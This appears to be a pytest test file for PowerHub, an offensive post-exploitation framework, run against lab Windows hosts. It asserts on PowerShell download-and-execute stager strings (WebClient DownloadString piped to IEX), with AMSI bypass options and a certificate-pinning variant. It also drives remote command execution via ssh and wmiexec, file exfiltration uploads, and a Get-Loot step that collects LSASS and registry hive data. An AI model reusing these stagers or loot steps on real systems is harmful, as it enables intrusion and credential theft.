#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
#  import tempfile
import re
import random
import requests

import pytest
import bs4

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests, execute_cmd  # noqa


MAX_TEST_MODULE_PS1 = 103

init_tests()


def get_stager():
    result = {}
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "Launcher": "powershell",
            "Amsi": "reflection",
            "SeparateAMSI": "true",
            "Transport": "http",
            "ClipExec": "none",
            "Proxy": "false",
            "TLS1.2": "false",
            "Fingerprint": "true",
            "NoVerification": "false",
            "CertStore": "false",
        },
        'HTTPS': {
            "flavor": "hub",
            "Launcher": "powershell",
            "Amsi": "reflection",
            "SeparateAMSI": "true",
            "Transport": "https",
            "ClipExec": "none",
            "Proxy": "false",
            "TLS1.2": "false",
            "Fingerprint": "true",
            "NoVerification": "false",
            "CertStore": "false",
        },
        'BASH': {
            "flavor": "hub",
            "Launcher": "bash",
            "Amsi": "reflection",
            "SeparateAMSI": "true",
            "Transport": "http",
            "ClipExec": "none",
            "Proxy": "false",
            "TLS1.2": "false",
            "Fingerprint": "true",
            "NoVerification": "false",
            "CertStore": "false",
        },
    }
    i = 0
    while i < 10:
        try:
            for k, v in param_set.items():
                response = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                        params=v).text
                soup = bs4.BeautifulSoup(response, features='lxml')
                result[k] = soup.find('code').getText()
            break
        except requests.exceptions.ConnectionError:
            i += 1
            time.sleep(.5)
    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'", '\\"')
    return result


def create_modules():
    func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
    from powerhub.directories import MOD_DIR
    for i in range(MAX_TEST_MODULE_PS1):
        with open(
            os.path.join(MOD_DIR, "psmod%d.ps1" % i),
            "w"
        ) as f:
            f.write(func % {"n": i})


@pytest.fixture(scope="module")
def full_app():
    from powerhub.app import PowerHubApp
    app = PowerHubApp()
    app.run(background=True)
    create_modules()
    yield get_stager()
    app.stop()


def test_stager(full_app):
    assert (
        "$K=New-Object Net.WebClient;'a=reflection','t=http'|%{IEX "
        + f"$K.DownloadString('http://{TEST_URI}:8080"
        + "/0?'+$_)"
    ) in (full_app['default'])
    assert (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
        + "={param($1,$2);$2.Thumbprint -eq '"
    ) in (full_app['HTTPS'])
    assert (
        "'};$K=New-Object Net.WebClient;'a=reflection','t=https'|%{IEX "
        + f"$K.DownloadString('https://{TEST_URI}:8443/0?'+$_)" + "}"
    ) in (full_app['HTTPS'])


@pytest.fixture(scope="module")
def backends(full_app):
    # win10 uses ssh
    win10cmd = TEST_COMMANDS["win10"] % full_app
    # Insert formatter for extra command
    win10cmd = win10cmd.replace('%', '%%')
    win10cmd = win10cmd[:-2] + ';%s' + win10cmd[-2:]

    # win7 uses wmiexec
    win7cmd = TEST_COMMANDS["win7"] % full_app
    win7cmd = win7cmd.replace('\\$', '$')
    win7cmd = win7cmd.replace('%', '%%')
    # Insert formatter for extra command
    win7cmd = win7cmd[:-3] + ';%s' + win7cmd[-3:]

    return {
        "win10": lambda c: win10cmd % c.replace('"', '\\"'),
        "win7": lambda c: win7cmd % c.replace('"', "'"),
    }


@pytest.fixture(scope="module", params=["win7", "win10"])
def backend(request, backends):
    """Parameterize backends"""
    return backends[request.param]


def test_start(backend):
    out = execute_cmd(backend(""))
    assert "Adrian Vollmer" in out
    assert "Run 'Help-PowerHub' for help" in out


def test_list_hubmodules(backend):
    out = execute_cmd(backend("lshm"))
    for i in range(MAX_TEST_MODULE_PS1):
        assert "psmod%d" % i in out


def test_load_hubmodule(backend):
    out = execute_cmd(backend("lhm psmod53|fl;Invoke-Testfunc53"))
    assert "Test53" in out
    assert "psmod53" in out
    assert re.search("Name *: .*psmod53.ps1\r\n", out)
    assert re.search("Type *: ps1\r\n", out)
    assert re.search("N *: 72\r\n", out)
    assert re.search("Loaded *: True\r\n", out)


def test_load_hubmodule_range(backend):
    out = execute_cmd(
        backend('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
                + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
    )
    # I don't understand the order of the modules
    assert "Test53" in out
    assert "Test99" in out
    assert "Test47" in out
    assert "Test72" in out


def test_upload(backend):
    from powerhub.directories import UPLOAD_DIR
    testfile = "testfile-%030x.dat" % random.randrange(16**30)
    out = execute_cmd(
        backend(('$p=Join-Path $env:TEMP "%s";'
                 + '[io.file]::WriteAllBytes($p,(1..255));'
                 + 'pth $p;rm $p') % testfile)
    )
    time.sleep(1)
    assert "At line:" not in out  # "At line:" means PS error
    with open(os.path.join(UPLOAD_DIR, testfile), "rb") as f:
        data = f.read()
    assert data == bytes(range(1, 256))

    out = execute_cmd(
        backend('$p="FooBar123";$p|pth -name %s;' % testfile)
    )
    time.sleep(1)
    assert "At line:" not in out  # "At line:" means PS error
    with open(os.path.join(UPLOAD_DIR, testfile+".1"), "rb") as f:
        data = f.read()
    assert data == b"FooBar123"


def test_get_loot(backend):
    from powerhub import sql
    loot_count = len(sql.get_loot())
    out = execute_cmd(backend('Get-Loot'))
    assert "At line:" not in out  # "At line:" means PS error
    #  for i in range(60):
    #      time.sleep(1)
    #      loot = sql.get_loot()
    #      if (loot and loot[0].lsass and loot[0].hive and loot[0].sysinfo):
    #          break
    #  assert i < 59
    loot = sql.get_loot()
    assert loot_count + 1 == len(loot)
    loot = loot[-1]
    assert "Administrator" in loot.hive
    assert "500" in loot.hive
    assert "Microsoft Windows" in loot.sysinfo
    assert "isadmin" in loot.sysinfo
    assert "session_id" in loot.lsass
